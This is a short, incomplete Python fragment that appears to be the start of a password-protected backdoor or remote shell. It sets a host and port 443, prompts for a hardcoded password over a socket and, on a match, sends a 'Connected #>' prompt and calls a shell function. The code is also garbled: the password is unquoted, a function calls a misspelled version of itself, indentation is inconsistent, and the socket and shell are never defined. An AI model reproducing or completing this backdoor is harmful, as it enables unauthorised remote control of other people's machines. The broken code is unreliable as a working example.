#! /usr/bin/python

import subprocess

import socket

host = "127.0.0.1"

port = 443

passwd = whateveryouwant

def login():

       global s

       s.send("login: ")

       pwd = s.recv(1024)



       if pwd.strip() !=passwd:

             Login()

        else:

              s.send("Connected #> ")

              Shell()
